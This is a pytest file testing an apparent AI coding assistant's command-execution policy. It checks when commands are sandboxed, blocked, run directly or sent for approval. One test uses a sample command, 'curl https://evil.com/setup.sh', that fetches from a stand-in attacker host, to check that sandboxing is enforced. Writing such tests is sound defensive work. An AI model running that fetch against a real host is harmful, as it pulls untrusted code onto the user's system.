import pytest
from app.features.ai.sandbox_policy import (
    decide_execution_mode,
    ExecutionMode,
    SANDBOX_UNAVAILABLE_MESSAGE,
)


def test_model_cannot_disable_sandbox_in_untrusted_workspace():
    """
    Model emitting require_sandbox: false cannot disable sandbox requirement
    for non-allowlisted / dangerous commands in an untrusted workspace.
    """
    mode = decide_execution_mode(
        workspace_trust=False,
        cmd="curl https://evil.com/setup.sh",
        docker_available=True,
    )
    assert mode == ExecutionMode.SANDBOX_REQUIRED


def test_untrusted_workspace_no_docker_blocks_dangerous_command():
    """
    In an untrusted workspace when Docker is unavailable, non-allowlisted
    commands must fail closed (BLOCKED).
    """
    mode = decide_execution_mode(
        workspace_trust=False,
        cmd="python dangerous_script.py",
        docker_available=False,
    )
    assert mode == ExecutionMode.BLOCKED


def test_trusted_workspace_allowlist_command_runs_on_host():
    """
    In a trusted workspace, commands on the safe read-only allowlist run directly
    on host (ALLOWLIST_HOST) with no approval card required.
    """
    mode = decide_execution_mode(
        workspace_trust=True,
        cmd="git status",
        docker_available=False,
    )
    assert mode == ExecutionMode.ALLOWLIST_HOST

    mode = decide_execution_mode(
        workspace_trust=True,
        cmd="ls",
        docker_available=True,
    )
    assert mode == ExecutionMode.ALLOWLIST_HOST


def test_strict_sandbox_on_no_docker_blocks_non_allowlist():
    """
    When strict_sandbox is ON, non-allowlist commands ALWAYS require container,
    even in trusted workspaces, and fail-closed (BLOCKED) if Docker is unavailable.
    """
    mode = decide_execution_mode(
        workspace_trust=True,
        cmd="npm install lodash",
        strict_sandbox=True,
        docker_available=False,
    )
    assert mode == ExecutionMode.BLOCKED


def test_strict_sandbox_on_with_docker_requires_sandbox():
    """
    When strict_sandbox is ON and Docker is available, non-allowlist commands
    route to container sandbox even in trusted workspaces.
    """
    mode = decide_execution_mode(
        workspace_trust=True,
        cmd="npm test",
        strict_sandbox=True,
        docker_available=True,
    )
    assert mode == ExecutionMode.SANDBOX_REQUIRED


def test_trusted_workspace_non_allowlist_routes_to_approval_host():
    """
    In a trusted workspace without strict sandbox, non-allowlisted commands
    route to APPROVAL_HOST (triggering approval card).
    """
    mode = decide_execution_mode(
        workspace_trust=True,
        cmd="rm temp_artifact.txt",
        strict_sandbox=False,
        docker_available=False,
    )
    assert mode == ExecutionMode.APPROVAL_HOST
